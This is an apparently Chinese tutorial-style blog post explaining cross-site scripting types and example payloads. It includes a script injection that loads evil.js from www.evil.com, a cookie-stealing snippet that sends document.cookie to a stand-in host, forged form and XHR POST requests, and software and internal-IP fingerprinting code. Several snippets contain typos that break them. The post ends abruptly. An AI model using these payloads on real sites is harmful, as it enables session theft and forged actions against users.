---
title: 跨站脚本攻击
date: 2017-08-05 09:20:08
tags: 安全
---

#### XSS 简介

XSS 攻击：黑客通过注入网页，从而在用户浏览网页时控制浏览器的一种行为。英文全称 Cross Site Script，本来缩写是 CSS，但是为了和层叠样式表(Cascading Style Sheet, CSS)有所区别，所以在安全领域叫 "XSS"。

反射型 XSS

- 反射型 XSS 只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型 XSS 也叫作“非持久型 XSS”(Non-persistent XSS)

存储型 XSS

- 储存型 XSS 会把用户输入的数据“存储”在服务器端。这种 XSS 具有很强的稳定性。比较常见的一个场景就是，黑客写下一篇含有恶意 JavaScript 代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。

- 存储型 XSS 通常也叫做“持久性 XSS”(Persistent XSS)，因为从效果上来说，它存在的时间是比较长的。

DOM Based XSS

- 实际上，这种类型的 XSS 并非按照“数据是否保存在服务器端”来划分，DOM Based XSS 从效果上来说是反射型 XSS。单独划分出来，是因为 Dom Based XSS 的形成原因比较特别，发现它的安全专家专门提出了这种类型的 XSS。处于历史原因，也就把它单独作为一个分类了。

例如：

```html
<script>
function test() {
    var str = document.getElementById("text").value;
    document.getElementById("t").innerHTML = "<a href='"+str+"'>testLink</a>";
}
</script>
<div id="t"></div>
<input type="text" id="text" value="">
<input type="button" id="a" value="write" onclick="test()"/>
```

#### XSS 攻击进阶

#### 初探 XSS Payload

一个最常见的 XSS Payload，就是通过读取浏览器的 Cookie 对象，从而发起“Cookie 劫持”攻击

如下所示，攻击者先加载一个远程脚本：

```html
http://www.a.com/test.htm?abc="><script src=http://www.evil.com/evil.js></script>
```

在 evil.js 中，可以通过如下代码窃取 Cookie：

```javascript
var img = document.createElement("img");
img.src = "http://www.evil.com/log?"+escape(document.cookie);
document.body.apendChild(img);
```

这段代码在页面中插入了一张看不见的图片，同时把 document.cookie 对象作为参数发送到远程服务器

#### 强大的 XSS Payload

构造一个 form 表单，然后自动提交这个表单

```javascript
var dd = document.createElement("div");
document.body.appendChild(dd);
dd.innerHTML = '<form action="" method="post" id="xssform" name"mbform">'+
'<input type="hidden" value="JiUY" name="ck" />'+
'<input type="text" value="test" name="mb_text" />'+
'<form>'
document.getElementById("xssform").submit();
```

通过 XMLHttpRequest 发送一个 POST 请求

```javascript
var url="http://www.douban.com";
var psotstr = "ck=JiUY&mb_text=test123";
var ajax = null;
if(window.XMLHttpRequest) {
    ajax = new XMLHttpRequest();
}
else if(window.ActiveXObject) {
    ajax = new ActiveXObject("Microsoft.XMLHTTP");
}
else{
    return;
}

ajax.open("POST", url, ture);
ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajax.send(postStr);

ajax.onreadystatechange = function() {
    if(ajax.readyState == 4 && ajax.status == 200) {
        alert("Done!");
    }
}
```

识别用户安装的软件

```javascript
try {
    var obj = new ActiveXObject('XunLeiBHO.ThunderIEHelper');
} catch(e) {
    // 异常，不存在该控件
}
```

如果客户端安装了 java 环境，那么 XSS 就可以通过调用 Java Applet 的接口获取客户端的本地 IP 地址。

```javascript
AttackAPI.dom.getInternalIP = function() {
    try {
        var sock = new java.net.Socket();
        sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
        sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
        return sock.getLocalAddress().getHostAddress();
    } catch(e) {}
    return '127.0.0.1';
};
```

#### XSS 攻击平台

- Attack API

- BeEF

- XSS-Proxy


#### 终极武器：XSS Worm

蠕虫是利用服务器端软件漏洞进行传播的，比如 2003 年的冲击波蠕虫，是利用 windows 的 RPC 远程溢出漏洞。

